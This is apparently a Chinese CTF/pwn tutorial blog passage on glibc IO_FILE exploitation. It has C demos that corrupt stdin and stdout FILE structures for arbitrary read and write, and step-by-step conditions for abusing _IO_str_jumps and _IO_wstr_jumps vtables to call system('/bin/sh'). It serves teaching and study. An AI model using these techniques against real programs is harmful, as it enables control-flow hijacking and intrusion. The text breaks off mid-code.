<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="comment">// 0x1ec980 为 _IO_2_1_stdin_ 偏移</span></span><br><span class="line">    FILE *fp = libc_base + <span class="number">0x1ec980</span>;</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x4</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_IO_buf_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_buf_end = (<span class="type">char</span> *) &amp;buf[<span class="number">99</span>];</span><br><span class="line">    <span class="built_in">fread</span>(stack_buf, <span class="number">1</span>, <span class="number">3</span>, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_buf: %s\n&quot;</span>, stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>libc6_2.31-0ubuntu9.9_amd64</code> 版本编译运行结果如下:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231020153758598.png"
                      alt="image-20231020153758598"
                ></p>
<p><strong>stdout 任意写</strong></p>
<p>有如下源码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">        count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">			count = to_do;</span><br><span class="line">        </span><br><span class="line">        f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">        s += count;</span><br><span class="line">        to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>将<code>_IO_write_ptr</code> 指向 <code>write_start</code> ，<code>_IO_write_end</code> 指向 <code>write_end</code> 即可实现在目标地址写入数据。</p>
<p><strong>示例</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> *stack_buf = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">0</span>];</span><br><span class="line">    fp-&gt;_IO_write_end = (<span class="type">char</span> *) &amp;buf[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">fwrite</span>(stack_buf, <span class="number">1</span>, <span class="number">8</span>, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nbuf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>libc6_2.31-0ubuntu9.9_amd64</code> 版本编译运行结果如下:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231020182423234.png"
                      alt="image-20231020182423234"
                ></p>
<p><strong>stdout 任意读</strong></p>
<p>程序正确执行到 <code>_IO_overflow</code> 时，有如下源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr 就会将待输出的数据写入缓冲区，_IO_overflow 只有在输出缓冲区写满的时候才将其	   *  输出。因此为了不造成不必要的麻烦，直接令 f-&gt;_IO_write_end = f-&gt;_IO_write_ptr 。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    	count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  	<span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  	<span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">			count = to_do;</span><br><span class="line">        </span><br><span class="line">      	f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      	s += count;</span><br><span class="line">      	to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// _flags 不能包含 _IO_NO_WRITES，其值为 0x8 。</span></span><br><span class="line">  	<span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">     	 f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      	__set_errno (EBADF);</span><br><span class="line">      	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//为了进入如下分枝进造成不必要的麻烦， _flags 应包含 _IO_CURRENTLY_PUTTING，其值为 0x0800</span></span><br><span class="line"> 	<span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">        <span class="comment">// _IO_write_base = read_start，_IO_write_ptr = read_end </span></span><br><span class="line">  		<span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    		<span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) <span class="built_in">new_do_write</span> (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_ver</span> (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// 构造 _flags 包含 _IO_IS_APPENDING，其值为 0x1000 </span></span><br><span class="line">    <span class="comment">// 或者 _IO_read_end 等于 _IO_write_base 就可以直接执行到 _IO_SYSWRITE</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    	fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  	<span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      	_IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      	<span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     	fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  	count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即</p>
<ul>
<li>设置 <code>_flag &amp;~ _IO_NO_WRITES</code> 即<code> _flag &amp;~ 0x8</code>。</li>
<li>设置<code> _flag &amp; _IO_CURRENTLY_PUTTING</code> 即 <code>_flag | 0x800</code></li>
<li>设置 <code>_IO_write_base</code> 指向想要泄露的地方；<code>_IO_write_ptr</code> 指向泄露结束的地址。</li>
<li>设置 <code>_IO_read_end</code> 等于<code> _IO_write_base</code> 或设置 <code>_flag &amp; _IO_IS_APPENDING</code> 即 <code>_flag | 0x1000</code>。</li>
<li>设置 <code>_IO_write_end</code> 等于 <code>_IO_write_ptr</code>（非必须）。</li>
</ul>
<p><strong>示例</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdef&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="comment">// _IO_2_1_stdout</span></span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x8</span>;</span><br><span class="line">    fp-&gt;_flags |= <span class="number">0x800</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">6</span>];</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022105118674.png"
                      alt="image-20231022105118674"
                ></p>
<h2 id="IO-str-jumps-与-IO-wstr-jumps"><a href="#IO-str-jumps-与-IO-wstr-jumps" class="headerlink" title="_IO_str_jumps 与 _IO_wstr_jumps"></a>_IO_str_jumps 与 _IO_wstr_jumps</h2><p><code>__start___libc_IO_vtables</code>指向第一个 <code>vtable</code> 地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个vtable<code>_IO_str_chk_jumps</code>结束的地址。想将 <code>vtable</code> 覆盖成外部地址且仍然通过检查，可以有两种方式：</p>
<ol>
<li>使得 <code>flag == &amp;_IO_vtable_check</code></li>
<li>使 <code>_dl_open_hook!= NULL</code></li>
<li>寻找其他位于<code>__start___libc_IO_vtables</code> 和 <code>__stop___libc_IO_vtables</code> 之间的 <code>vtable</code></li>
</ol>
<p>第一种方式不可控，因为 <code>flag</code> 的获取和比对是类似 <code>canary</code> 的方式，其对应的汇编代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;_IO_vtable_check+7&gt;     mov    rax, qword ptr [rip + 0x32bb2a] &lt;0x7fefcac69458&gt;</span><br><span class="line">&lt;_IO_vtable_check+14&gt;    ror    rax, 0x11</span><br><span class="line">&lt;_IO_vtable_check+18&gt;    xor    rax, qword ptr fs:[0x30]</span><br><span class="line">&lt;_IO_vtable_check+27&gt;    cmp    rax, rdi</span><br></pre></td></tr></table></figure></div>

<p>第二种方式，理论上可行，但是如果我们可以找到存在往<code>_dl_open_hook</code>中写值的方法，完全利用该方法来进行更为简单的利用。</p>
<p>第三种方式， <code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 这两个 <code>vtable</code> 就位于 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code> 的检测的，只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code> 或 <code>_IO_wstr_jumps</code> 地址即可。<code>_IO_wstr_jumps</code>与<code>_IO_str_jumps</code>功能基本一致，只是<code>_IO_wstr_jumps</code>是处理 <code>wchar</code>的，利用方式主要有针对 <code>_IO_str_jumps</code> 中的 <code>_IO_str_finsh</code> 函数和 <code>_IO_str_overflow</code> 两种。</p>
<p><strong>一些下面用到的结构体定义</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure></div>

<h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_str_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, _IO_str_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, _IO_str_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_default_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_str_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_default_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_default_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_default_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_default_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_default_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_default_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_default_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_str_jumps</code> 符号在 <code>strip</code> 后会丢失，定位其地址方法如下：</p>
<ul>
<li><code>_IO_str_jumps</code>是 <code>vtable</code> 中的倒数第二个表，可以通过 <code>vtable</code> 的最后地址减去<code>0x168</code>。</li>
<li><code>IDA</code> 寻找<code>_IO_file_jumps</code> 在后面找到<code>_IO_str_****</code>的函数表即可。</li>
</ul>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022121407625.png"
                      alt="image-20231022121407625"
                ></p>
<p><strong>_IO_str_finish</strong></p>
<p>下面是 <code>_IO_str_finish</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* glibc &lt; 2.28 的实现 */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它使用了 <code>_IO_FILE</code> 结构体中的值当作函数地址来直接调用，如果修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为 <code>/bin/sh\x00</code> 字符串地址，然后触发程序执行 <code>_IO_str_finish</code> 函数就可以得到 <code>shell</code> 。</p>
<blockquote>
<ul>
<li>首先需要绕过之前的 <code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查 <code>_mode&lt;=0</code> 以及<code>_IO_write_ptr&gt;_IO_write_base</code> 进入到 <code>_IO_OVERFLOW</code> 中。</li>
<li>将 <code>vtable</code> 的地址覆盖成 <code>_IO_str_jumps-0x8</code> 的地址，这样原来 <code>_IO_OVERFLOW</code> 就变成 <code>_IO_str_finish</code>。</li>
<li><code>fp-&gt;_IO_buf_base = &quot;/bin/sh\x00&quot;</code> 作为函数第一个参数。</li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>fp-&gt;_s._free_buffer(fp+0xe8)</code>改为<code>system</code>或<code>one gadget</code>的地址。</li>
</ul>
</blockquote>
<p><strong>_IO_str_overflow</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span></span><br><span class="line">  	pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// not allowed 绕过 _IO_USER_BUF(0x01)</span></span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF)</span><br><span class="line">			<span class="keyword">return</span> EOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">char</span> *new_buf;</span><br><span class="line">	  		<span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">            <span class="comment">// fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base，这里让 _IO_buf_base = 0;</span></span><br><span class="line">	  		<span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">            <span class="comment">// fp-&gt;_IO_buf_end = (bin_sh_addr - 100) / 2</span></span><br><span class="line">	  		_IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  		<span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    		<span class="keyword">return</span> EOF;</span><br><span class="line">            <span class="comment">// 函数指针调用 fp+0xe8 = system_addr</span></span><br><span class="line">	  		new_buf= (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即绕过条件为 </p>
<blockquote>
<ul>
<li>首先需要绕过之前的 <code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查 <code>_mode&lt;=0</code> 以及<code>_IO_write_ptr&gt;_IO_write_base</code> 进入到 <code>_IO_OVERFLOW</code> 中。</li>
<li><code>_IO_buf_base = 0</code>，<code>_IO_buf_end = (bin_sh_addr - 100) / 2</code></li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>_IO_write_ptr = ((bin_sh_addr - 100) / 2) +1</code> 且<code>_IO_write_base = 0x0</code></li>
<li><code>fp-&gt;_s._allocate_buffer(fp+0xe0)</code> 改为 <code>system</code> 或 <code>one_gadget</code> 地址。</li>
</ul>
</blockquote>
<p>直接将 <code>vtable-&gt;fake_IO_str_jumps_vtable</code> 即可，因为 <code>_IO_str_overflow</code> 也在 <code>0x18</code> 的位置。</p>
<h3 id="IO-wstr-jumps"><a href="#IO-wstr-jumps" class="headerlink" title="_IO_wstr_jumps"></a>_IO_wstr_jumps</h3><p>其用法和<code>_IO_str_jumps</code> 相似，<code>_IO_wstr_jumps</code>与<code>_IO_str_jumps</code>功能基本一致，只是<code>_IO_wstr_jumps</code>是处理 <code>wchar</code>的。其定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_wstr_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_wstr_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, (_IO_overflow_t) _IO_wstr_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_default_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_default_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_default_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_default_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_default_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_default_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><strong>_IO_wstr_overflow</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wint_t</span><br><span class="line">_IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == WEOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : WEOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_wblen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags2 &amp; 